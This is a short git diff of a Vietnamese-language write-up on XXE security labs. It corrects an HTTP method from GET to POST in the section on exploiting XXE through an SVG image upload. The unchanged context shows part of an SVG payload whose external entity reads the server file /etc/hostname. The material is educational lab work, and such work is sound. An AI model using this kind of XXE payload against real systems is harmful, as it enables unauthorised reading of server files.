@@ -55,7 +55,7 @@ Lưu ý là productId được URL encoded. Sau khi gửi, ta có được nội
 ![image](https://user-images.githubusercontent.com/103978452/206656757-5f3e6ceb-c0a4-49f2-bda6-b7cce8430317.png)
 
 # 8. Exploiting XXE via image file upload
-Trong request `GET /post/comment`, ta upload file svg với nội dung như sau:
+Trong request `POST /post/comment`, ta upload file svg với nội dung như sau:
 ```
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
 <svg version="1.1" height="50" width="300"
